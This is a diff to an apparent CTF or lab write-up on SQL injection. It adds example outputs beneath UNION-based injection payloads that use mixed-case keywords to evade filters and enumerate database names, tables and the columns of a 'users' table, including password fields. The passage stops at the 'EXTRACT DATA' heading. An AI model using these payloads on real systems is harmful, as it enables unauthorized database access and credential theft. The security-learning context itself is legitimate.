@@ -24,15 +24,21 @@ Then the following codes will extract the databases'name, tables'name, columns'n
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
 
+OUTPUT:     leettime_761wHole
 
 #### Extract TABLES NAME
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C),3+fRoM+information_schema.tables+wHeRe+table_schema=database()%23`
 
+OUTPUT:     |testtable1|,|userlogs|,|users|
 
 #### Extract COLUMNS NAME
 
+>>> REMEMBER USE SINGLE QUOTE  <<<
+
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C),3+fRoM+information_schema.columns+wHeRe+table_name='users'%23`
+
+OUTPUT:    |id|,|username|,|password|,|user_type|,|sec_code|  
 
 #### EXTRACT DATA
 
